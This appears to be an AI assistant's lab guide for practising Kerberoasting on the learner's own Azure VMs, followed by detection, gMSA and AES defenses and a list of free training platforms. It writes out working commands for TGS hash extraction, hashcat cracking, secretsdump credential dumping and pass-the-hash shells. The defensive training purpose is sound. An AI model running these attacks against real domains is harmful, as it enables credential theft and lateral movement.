 Here's your complete lab guide. 🎯

---

# 🧪 FREE KERBEROASTING & AD ATTACK LABS
## *Best Alternatives — Ranked for Your Level*

---

## 🥇 OPTION 1 — BUILD IT YOURSELF (BEST OPTION FOR YOU)

This is honestly the **most valuable** approach. You already have Kali Linux + Azure VMs. Let's use them.

```
WHY YOUR OWN LAB BEATS ANY PLATFORM:
─────────────────────────────────────────────────────────
✅ 100% free — you already have everything
✅ Real tools — same ones used in actual attacks
✅ You control the environment — break and fix freely
✅ Interviewers love "I built my own AD attack lab"
✅ Connects directly to SecureCorp story we built
✅ No time limits — work at your own pace
```

### Your Lab Setup on Azure (You Already Have This!)

```
WHAT YOU NEED — ALL ALREADY AVAILABLE TO YOU:
─────────────────────────────────────────────────────────
VM 1: Windows Server 2025 (DC01)     ← Azure VM
VM 2: Windows 10 Client (Gani's PC)  ← Azure VM
VM 3: Kali Linux                     ← Already installed
─────────────────────────────────────────────────────────

COST: Use Azure B2s VMs (~₹8/hour)
      Run lab for 3 hours = ₹24
      Stop VMs when done = no ongoing cost
```

### Complete Lab — Kerberoasting Attack + Defense

**PHASE 1 — Setup the Vulnerable Environment (30 min)**

```powershell
# On DC01 — Create vulnerable service account (SQLSvc):
New-ADUser `
  -Name "SQLSvc" `
  -SamAccountName "sqlsvc" `
  -AccountPassword (ConvertTo-SecureString "SqlServer2019!" -AsPlainText -Force) `
  -Enabled $true `
  -PasswordNeverExpires $true `
  -Description "SQL Service Account - DO NOT MODIFY"

# Assign SPN to make it Kerberoastable:
setspn -a MSSQLSvc/SQLDB01.securecorp.local:1433 sqlsvc
setspn -a MSSQLSvc/SQLDB01:1433 sqlsvc

# Verify SPN assigned:
setspn -L sqlsvc

# Output should show:
# Registered ServicePrincipalNames for CN=SQLSvc...:
# MSSQLSvc/SQLDB01.securecorp.local:1433
# MSSQLSvc/SQLDB01:1433

# Create low-privilege user (attacker's entry point — Gani):
New-ADUser `
  -Name "Gani" `
  -SamAccountName "gani" `
  -AccountPassword (ConvertTo-SecureString "Welcome@1234" -AsPlainText -Force) `
  -Enabled $true
```

**PHASE 2 — Perform the Attack from Kali (30 min)**

```bash
# On your Kali Linux machine:

# STEP 1 — Install Impacket (if not already installed):
sudo apt update
sudo apt install python3-impacket -y
# OR:
pip3 install impacket

# STEP 2 — Find ALL Kerberoastable accounts using Gani's credentials:
impacket-GetUserSPNs securecorp.local/gani:'Welcome@1234' \
  -dc-ip 192.168.1.10 \
  -request

# OUTPUT YOU'LL SEE:
# ServicePrincipalName                   Name    MemberOf  PasswordLastSet
# ─────────────────────────────────────────────────────────────────────────
# MSSQLSvc/SQLDB01.securecorp.local:1433 sqlsvc            2026-04-01
#
# $krb5tgs$23$*sqlsvc$SECURECORP.LOCAL$MSSQLSvc/SQLDB01...*
# $abc123def456...  ← THIS IS THE HASH TO CRACK

# STEP 3 — Save the hash:
impacket-GetUserSPNs securecorp.local/gani:'Welcome@1234' \
  -dc-ip 192.168.1.10 \
  -request \
  -outputfile kerberoast_hashes.txt

cat kerberoast_hashes.txt
# You'll see the full $krb5tgs$ hash

# STEP 4 — Crack it with Hashcat:
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

# -m 13100 = Kerberos TGS-REP hash type
# rockyou.txt = most common password wordlist

# RESULT after a few minutes:
# $krb5tgs$23$*sqlsvc*...:SqlServer2019!
#                          ↑ CRACKED! Plain text password

# STEP 5 — Alternative tool — Rubeus (from Windows client):
# Download Rubeus on Windows 10 client:
# https://github.com/r3motecontrol/Ghostpack-CompiledBinaries

.\Rubeus.exe kerberoast /outfile:hashes.txt
# Then transfer hashes.txt to Kali and crack with hashcat
```

**PHASE 3 — Detect the Attack (What Navi Sees) (20 min)**

```powershell
# On DC01 — Check the evidence:
Get-WinEvent -FilterHashtable @{
  LogName = 'Security'
  Id = 4769
} -MaxEvents 20 |
Select-Object TimeCreated,
  @{N='Account';E={$_.Properties[0].Value}},
  @{N='Service';E={$_.Properties[2].Value}},
  @{N='EncryptionType';E={$_.Properties[6].Value}} |
Format-Table -AutoSize

# WHAT YOU'LL SEE:
# TimeCreated          Account  Service   EncryptionType
# ──────────────────────────────────────────────────────
# 05/04/2026 10:30:01  gani     sqlsvc    0x17  ← RC4! Red flag!
# 05/04/2026 10:30:01  gani     sqlsvc    0x17  ← Multiple requests!

# Encryption type 0x17 = RC4 = Kerberoasting indicator
# Encryption type 0x12 = AES256 = Normal/Safe
```

**PHASE 4 — Apply the Defense (20 min)**

```powershell
# DEFENSE 1: Convert SQLSvc to gMSA:
# (Follow Day 2 gMSA steps we covered)
Add-KdsRootKey -EffectiveTime ((Get-Date).AddHours(-10))

New-ADServiceAccount `
  -Name "gMSA-SQLSvc" `
  -DNSHostName "sqldb01.securecorp.local" `
  -PrincipalsAllowedToRetrieveManagedPassword "Domain Computers"

# Disable old SQLSvc:
Disable-ADAccount -Identity "sqlsvc"

# DEFENSE 2: Try Kerberoasting again from Kali:
impacket-GetUserSPNs securecorp.local/gani:'Welcome@1234' \
  -dc-ip 192.168.1.10 \
  -request

# OUTPUT NOW:
# No entries found!  ← gMSA has no SPN that can be roasted
# Attack completely failed ✅

# DEFENSE 3: Enforce AES encryption only:
Set-ADUser sqlsvc -KerberosEncryptionType AES256
# Now even if SPN exists → AES ticket → takes years to crack
```

**PHASE 5 — Pass-the-Hash Lab (20 min)**

```bash
# On Kali — simulate PtH after getting a hash:

# First get a hash (Mimikatz on Windows or secretsdump from Kali):
impacket-secretsdump securecorp.local/hareesh:'Hareesh@SecureCorp#1'@192.168.1.10

# You'll see hashes for all users:
# hareesh:1001:aad3b435b51404eeaad3b435b51404ee:8f14e45fceea167...:::

# Now use that hash to authenticate WITHOUT the password:
impacket-psexec securecorp.local/hareesh@192.168.1.20 \
  -hashes aad3b435b51404eeaad3b435b51404ee:8f14e45fceea167...

# If successful → you have a shell on SQLDB01 as hareesh
# This is Pass-the-Hash — no password needed!

# DEFENSE — Check Protected Users stops this:
# Add hareesh-t0 to Protected Users group
# Try PtH again → Should fail!
```

---

## 🥈 OPTION 2 — HACKTHEBOX FREE TIER

HackTheBox has a free "Camp Fire 1" Sherlock focused on forensics and detection of Kerberoasting attacks — you explore domain controller logs and endpoint artifacts from the host that conducted the activity. It has a guided mode perfect for beginner SOC analysts.

```
HACKTHEBOX FREE RESOURCES FOR AD ATTACKS:
─────────────────────────────────────────────────────────
1. HTB Sherlock — "Camp Fire 1" (FREE)
   → Kerberoasting detection from DC logs
   → Perfect for SOC Analyst perspective
   → URL: app.hackthebox.com/sherlocks
   → Search: "Camp Fire 1"

2. HTB Blog — Kerberoasting Attack Detection (FREE)
   → Full walkthrough with detection logic
   → URL: hackthebox.com/blog/kerberoasting-attack-detection
   → Read this alongside your lab

3. HTB Retired Machines with AD (FREE after retirement):
   → "Forest" machine — Full AD attack chain
   → "Active" machine — Kerberoasting focused
   → "Sauna" machine — AS-REP Roasting
   → Search these on: app.hackthebox.com/machines
```

---

## 🥉 OPTION 3 — CYBERDEFENDERS (100% FREE)

```
CYBERDEFENDERS.ORG — FREE AD LABS:
─────────────────────────────────────────────────────────
Platform: cyberdefenders.org
Cost: FREE — no subscription needed
Focus: Blue Team / SOC Analyst perspective (perfect for you!)

RECOMMENDED LABS:
1. "DetectiveAD"     → AD attack detection from logs
2. "OpenWire"        → Network attack analysis
3. "Hammered"        → Log analysis and attack detection
4. "PsExec Hunt"     → Lateral movement detection

HOW IT WORKS:
→ Download a PCAP or log file
→ Answer questions based on your analysis
→ Learn by investigating real attack artifacts
→ Perfect SOC analyst training
```

---

## 📚 OPTION 4 — FREE WRITTEN LABS (SELF-GUIDED)

HackingArticles.in has a complete Kerberoasting lab guide covering the full attack using Impacket's GetUserSPNs, Rubeus, and NXC tools, with detection via Event ID 4769 and mitigation strategies — all free and self-guided.

```
FREE WRITTEN RESOURCES WITH EXACT COMMANDS:
─────────────────────────────────────────────────────────
1. HackingArticles.in — Kerberoasting in Active Directory
   URL: hackingarticles.in/kerberoasting-attack-in-active-directory
   → Complete lab setup + attack + detection + defense

2. HTB Blog — AD Attack Detection Series (5 parts FREE):
   Part 1: Kerberoasting detection
   Part 2: AS-REP Roasting detection
   Part 3: LLMNR poisoning detection
   Part 4: NTLM relay detection
   Part 5: NTDS dumping detection
   URL: hackthebox.com/blog/kerberoasting-attack-detection
```

---

## 🗺️ YOUR RECOMMENDED LAB SEQUENCE

```
THIS WEEKEND — LAB PLAN (3 hours total):
══════════════════════════════════════════════════════
HOUR 1 — Build the Attack (your Azure lab):
  ├── 30 min: Setup DC01 + create SQLSvc account
  └── 30 min: Kerberoast it from Kali → crack password

HOUR 2 — Defend and Detect:
  ├── 20 min: Check Event ID 4769 on DC01
  ├── 20 min: Convert SQLSvc to gMSA
  └── 20 min: Kerberoast again → confirm it fails

HOUR 3 — Blue Team Perspective:
  ├── 30 min: HTB Sherlock "Camp Fire 1" (free)
  │           Investigate Kerberoasting from log artifacts
  └── 30 min: CyberDefenders "DetectiveAD" lab
══════════════════════════════════════════════════════

RESULT:
✅ You've attacked — you know how it works
✅ You've defended — you know how to stop it
✅ You've investigated — you know how to detect it
✅ That's the complete SOC Analyst skill for this attack
```

---

## 💡 TOOLS INSTALLED ON YOUR KALI — VERIFY THESE

```bash
# Check these are ready before the lab:

# Impacket suite:
impacket-GetUserSPNs --help
impacket-secretsdump --help
impacket-psexec --help

# If not installed:
sudo apt install python3-impacket -y

# Hashcat:
hashcat --version
# If not installed:
sudo apt install hashcat -y

# Rockyou wordlist:
ls /usr/share/wordlists/rockyou.txt
# If compressed:
sudo gunzip /usr/share/wordlists/rockyou.gz

# BloodHound (for Day 5):
bloodhound --version
# If not installed:
sudo apt install bloodhound -y
```

---

> 💡 **Architect's Advice:** *"The best lab is your own lab. Every security engineer I've hired who impressed me in interviews had one thing in common — they built something, broke it, and fixed it. Not just watched someone else do it. When you tell an interviewer 'I set up a Windows Server DC on Azure, created a vulnerable service account, Kerberoasted it from Kali, cracked the hash with Hashcat, then converted it to gMSA and confirmed the attack failed' — that's a hire. That story comes from YOUR lab this weekend."*

---

**This weekend's mission:** Azure DC01 + Kali = Kerberoasting live.  💪🔐
